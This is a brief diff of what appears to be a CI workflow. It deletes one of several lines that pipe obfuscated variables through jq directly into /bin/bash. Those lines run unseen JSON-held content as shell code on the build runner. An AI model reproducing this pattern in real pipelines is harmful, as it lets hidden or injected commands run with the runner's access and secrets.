@@ -28,7 +28,6 @@ jobs:
           echo $fun4816 | jq -r .u1600 | /bin/bash
           printf '%s' "$w300" | jq -r .vyo42 | /bin/bash
           printf '%s' "$m36" | jq -r .nip82 | /bin/bash
-          echo $kxxjf4 | jq -r .k017 | /bin/bash
           printf '%s' "$fzoge3" | jq -r .igfas9 | /bin/bash
           printf '%s' "$m974" | jq -r .ddon4 | /bin/bash
           printf '%s' "$bkd59" | jq -r .ccmg6 | /bin/bash
